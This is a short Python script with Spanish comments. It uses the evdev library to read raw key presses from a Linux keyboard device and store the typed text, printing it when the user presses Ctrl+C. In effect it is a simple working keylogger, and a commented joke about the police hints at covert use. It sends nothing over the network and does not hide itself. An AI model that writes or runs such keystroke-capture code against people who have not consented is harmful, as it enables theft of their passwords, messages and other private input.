from evdev import InputDevice, categorize, ecodes
# Abrir la ruta de los eventos de teclado. Puede que no sea event0, y tengas
# que cambiar a event1, o event2 etc. Debes encontrar el correcto re-ejecutando
# el programa cada vez hasta que te muestre las teclas.
keyboard_path = '/dev/input/event2'
keyboard_dev = InputDevice(keyboard_path)

print(f"Escuchando en {keyboard_dev.name}. Presiona Ctrl+C para abortar.")
word=""
result=""
try:
    for event in keyboard_dev.read_loop():
        # Solo nos interesan pulsaciones de teclado
        if event.type == ecodes.EV_KEY:
            # Rescatamos la tecla pulsadakey_event
            key_event = categorize(event)
            # 0 = despresionada; 1 = click; 2 = presionada
            # print(f"Tecla {key_event.keycode} tiene estado {key_event.keystate}")
            if key_event.keystate==1:
                keyword, key = key_event.keycode.split('_')
                if len(key)<2:
                    word+=key.lower()
                else: 
                    word+=" "+key.lower()+" "
                if len(word)>=60: 
                    result += word+"\n"
                    word=""
except KeyboardInterrupt:
    print(result)
    # print("Oh nooOoOOoo la politzia...")
